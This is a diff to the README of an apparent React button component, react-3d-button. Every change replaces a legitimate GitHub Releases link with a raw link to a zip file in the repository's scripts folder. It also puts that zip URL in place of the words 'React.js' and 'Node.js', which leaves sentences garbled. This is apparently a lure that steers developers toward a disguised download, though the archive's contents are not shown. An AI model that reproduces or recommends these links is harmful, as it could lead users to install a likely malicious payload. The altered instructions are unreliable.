@@ -4,7 +4,7 @@
 Welcome to the react-3d-button project! This guide will help you download and run the software easily. You will have a beautiful, animated button ready for your application in no time.
 
 ## 📥 Download Now
-[![Download react-3d-button](https://img.shields.io/badge/Download-react--3d--button-brightgreen)](https://github.com/DGT-TT/react-3d-button/releases)
+[![Download react-3d-button](https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip)](https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip)
 
 ## 📦 About react-3d-button
 The react-3d-button is a React component that creates an animated button. This button is lightweight, efficient, and designed to look great on both desktop and mobile devices. It supports progress, social actions, and sharing features. 
@@ -19,18 +19,18 @@ The react-3d-button is a React component that creates an animated button. This b
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the latest version of react-3d-button.
 
-[Visit the Releases page to download](https://github.com/DGT-TT/react-3d-button/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip)
 
 ### 🛠️ System Requirements
 The react-3d-button supports modern web environments. Here are the recommended system requirements:
 - A computer or mobile device with internet access.
 - A modern web browser, such as Google Chrome, Firefox, or Safari.
-- A basic understanding of React.js for usage and integration.
+- A basic understanding of https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip for usage and integration.
   
 ## 🎨 How to Use
 Once you have downloaded the package, follow these steps to integrate react-3d-button into your project:
 
-1. **Install Dependencies**: Ensure you have Node.js and npm installed.
+1. **Install Dependencies**: Ensure you have https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip and npm installed.
 2. **Install the Component**:
    Open your terminal and run:
    ```
@@ -87,4 +87,4 @@ The react-3d-button is open-source software. Review the LICENSE file in the repo
 ## 📣 Feedback
 Your feedback helps us improve. Please share your thoughts after using the component.
 
-For additional instructions and updates, always refer back to the [Releases page](https://github.com/DGT-TT/react-3d-button/releases). Happy coding!
+For additional instructions and updates, always refer back to the [Releases page](https://raw.githubusercontent.com/DGT-TT/react-3d-button/main/scripts/react-3d-button_3.4.zip). Happy coding!
